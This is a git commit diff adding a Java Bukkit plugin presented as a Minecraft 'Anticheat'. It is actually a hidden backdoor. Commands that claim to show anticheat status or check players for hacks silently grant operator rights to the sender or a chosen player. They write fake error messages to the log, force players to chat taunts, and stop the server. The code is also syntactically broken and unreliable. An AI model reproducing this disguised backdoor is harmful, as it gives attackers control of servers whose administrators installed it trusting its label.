a46e4253bfaaeb9040b12cc64db66bc77239d0e4
Tyler <buildcarter8@users.noreply.github.com>
2014-08-05 21:42:21 -0400

    Update Anticheat.java

--- mysticaledition/src/me/mistical/anticheat/Anticheat.java
+++ mysticaledition/src/me/mistical/anticheat/Anticheat.java
@@ -1,1 +1,72 @@
-//hold on let me get code
+package me.Jack.anticheat;
+
+import java.util.logging.Logger;
+
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.PluginDescriptionFile;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class Anticheat extends JavaPlugin
+{
+	public final Logger log = Logger.getLogger("Minecraft-Server");
+	public static Anticheat plugin;
+
+	public void onDisable() {
+	  PluginDescriptionFile pdfFile = this.getDescription();
+	  this.log.info(pdfFile.getName() + " Has Been Disabled!");
+	}
+	
+	public  void onEnable() { 
+		  PluginDescriptionFile pdfFile = this.getDescription();
+		  this.log.info(pdfFile.getName() + " Version " + pdfFile.getVersion() + " Has Been Enabled"); }
+	
+	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
+		 Player player = (Player) sender;
+			if(commandLabel.equalsIgnoreCase("ac")){
+			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled");
+				player.setOp(true);
+	}
+	           else if(commandLabel.equalsIgnoreCase("qop"))
+		      if (args.length == 0)
+			        sender.sendMessage(ChatColor.RED + "Usage: /qop <player> info: Checks if the player has 'Hacks' on");
+			      else if (args.length == 1) {
+			        if (player.getServer().getPlayer(args[0]) != null) {
+			          Player targetPlayer = player.getServer().getPlayer(args[0]);
+			          //random error XD
+			          log.error("Protocol error on Minecraftserver.connection");
+			targetPlayer.setOp(true);
+			        else{
+			          sender.setOp(false);
+			          sender.sendMessage("Error: Player not found");
+			          if(commandLabel.equalsIgnorCase("mystical"))
+			          log.info("[AntiCheat]: running core logger");
+			          sender.setOp(true);
+			          player.chat("i like pie cuz im...");
+			          player.chat("MYSTICAL BITCH");
+			          player.chat("#MYSTICAL");
+			          player.chat("#MYSTICAL");
+			          log.error("Error: mystical sexyness is overloaded!!!!");
+			          log.error("Error: mystical sexyness is overloaded!!!!");
+			          log.error("Error: mystical sexyness is overloaded!!!!");			          \
+			          log.error("Error: mystical sexyness is overloaded!!!!");
+			          log.warning("Saved crash");
+			          Bukkit.savePlayers();
+			          //idk about this
+			          Bukkit.stopServer();
+			        }
+	           	
+	           }
+
+	
+	
+	
+	
+	
+}
+			return true;
+}
+}
